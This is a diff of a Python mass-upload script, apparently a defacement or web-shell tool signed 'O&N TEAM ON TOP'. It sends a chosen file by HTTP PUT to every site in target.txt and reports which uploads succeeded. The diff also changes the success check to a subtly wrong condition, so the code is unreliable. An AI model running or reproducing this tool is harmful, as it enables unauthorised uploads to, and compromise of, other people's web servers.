@@ -16,7 +16,7 @@ banner = """
 ░ ▒░▒░▒░ ░ ▒░   ▒ ▒     opaleeeeeee7
   ░ ▒ ▒░ ░ ░░   ░ ▒░    lvtkr
 ░ ░ ░ ▒     ░   ░ ░ 
-    ░ ░           ░ 
+    ░ ░           ░     O&N TEAM ON TOP
                     """
 
 b = '\033[31m'
@@ -44,7 +44,7 @@ def aox(script,target_file="target.txt"):
             if site.startswith("http://") is False:
                site = "http://" + site
             req = s.put(site+"/"+script,data=op)
-            if req.status_code < 200 or req.status_code >= 250:
+            if req.status_code > 200 or req.status_code >= 250:
                print(m+"❌"+b+" FAILED"+m+" %s/%s"%(site,script))
             else:
                print(m+"✅"+h+" UPLOADED"+m+" %s/%s"%(site,script))
